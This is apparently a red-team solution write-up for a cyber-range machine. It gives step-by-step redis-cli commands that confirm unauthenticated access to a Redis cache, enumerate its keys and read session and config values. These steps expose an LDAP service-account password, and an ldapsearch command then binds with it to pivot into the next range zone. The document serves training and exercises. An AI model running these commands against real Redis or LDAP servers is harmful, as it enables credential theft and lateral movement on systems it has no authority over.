# solve_red.md — M5 · itgw-cache
## Red Team Solution Writeup
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M5 — Application Cache Host
**Vulnerability:** Redis No-Auth Exposure + Sensitive Session/Config Data in Cache Keys
**MITRE ATT&CK:** T1552 (Unsecured Credentials) · T1005 (Data from Local System)
**Severity:** Critical
**Kill Chain Stage:** Credential Access → Pivot to RNG-IT-02

---

## Objective
Connect to the Redis instance on `203.x.x.x:6379` without authentication, enumerate all keys, read the LDAP configuration key to extract the `svc-deploy` service account credential, and use it as the pivot artifact into RNG-IT-02 (`203.x.x.x/24`).

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.x.x.x` |
| Service Port | `6379` (TCP) |
| Auth Required | None (no-auth misconfiguration) |
| Pivot From | M4 SNMP OIDs (Redis host + credential fragments) |

---

## Step-by-Step Exploitation

### Step 1 — Confirm Unauthenticated Access

```bash
redis-cli -h 203.x.x.x -p 6379 ping
# Expected: PONG
redis-cli -h 203.x.x.x -p 6379 info server | head -10
```

<img width="1175" height="155" alt="image" src="https://github.com/user-attachments/assets/042b073d-3556-400a-aa16-5a290ababc18" />


<img width="1048" height="391" alt="image" src="https://github.com/user-attachments/assets/567e153b-b2f2-4f2f-bc52-0db387b5db25" />



No `NOAUTH` error confirms the instance requires no password.

### Step 2 — Enumerate All Keys

```bash
redis-cli -h 203.x.x.x -p 6379 KEYS "*"
```

Expected output:
```
1) "pul:session:admin"
2) "pul:config:ldap"
3) "pul:config:app"
4) "pul:queue:deploy"
5) "pul:ratelimit:203.0.1.X"
```

<img width="726" height="262" alt="image" src="https://github.com/user-attachments/assets/05febbe4-6552-42da-a493-a0436f20cf39" />


### Step 3 — Read Sensitive Keys

```bash
# Admin session — contains LDAP bind credential
redis-cli -h 203.x.x.x -p 6379 GET "pul:session:admin"

# LDAP config — pivot credential for IT-2
redis-cli -h 203.x.x.x -p 6379 GET "pul:config:ldap"

# App config — reveals DB host in IT-2 zone
redis-cli -h 203.x.x.x -p 6379 GET "pul:config:app"

# Deployment queue — reveals internal network targets
redis-cli -h 203.x.x.x -p 6379 LRANGE "pul:queue:deploy" 0 -1
```

<img width="2006" height="562" alt="image" src="https://github.com/user-attachments/assets/9eb877b5-acca-48b6-b703-30d48f307c02" />


### Step 4 — Extract the Pivot Credential

From `pul:config:ldap`:
```json
{
  "host": "203.x.x.x",
  "port": 389,
  "base_dn": "dc=prabalurja,dc=in",
  "bind_dn": "cn=svc-deploy,ou=service,dc=prabalurja,dc=in",
  "bind_pass": "D3pl0y@PUL2024",
  "note": "Internal LDAP for IT-Ops zone — RNG-IT-02 directory service"
}
```
<img width="2017" height="171" alt="image" src="https://github.com/user-attachments/assets/4963598f-b499-4fba-b5a0-fc6dd4db2e44" />


**Pivot credential for RNG-IT-02:**
- **LDAP Host:** `203.x.x.x:389`
- **Bind DN:** `cn=svc-deploy,ou=service,dc=prabalurja,dc=in`
- **Password:** `D3pl0y@PUL2024`

### Step 5 — Verify LDAP Pivot

```bash
ldapsearch -x -H ldap://203.x.x.x:389 \
  -D "cn=svc-deploy,ou=service,dc=prabalurja,dc=in" \
  -w "D3pl0y@PUL2024" \
  -b "dc=prabalurja,dc=in" "(objectClass=*)" dn
```

<img width="1279" height="373" alt="image" src="https://github.com/user-attachments/assets/2e91e2fe-7877-4578-82c9-d238efeb899d" />


Successful bind confirms the pivot credential is valid for RNG-IT-02.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials | T1552 |
| Collection | Data from Local System | T1005 |
| Lateral Movement | Remote Services | T1021 |
| Discovery | Network Service Discovery | T1046 |
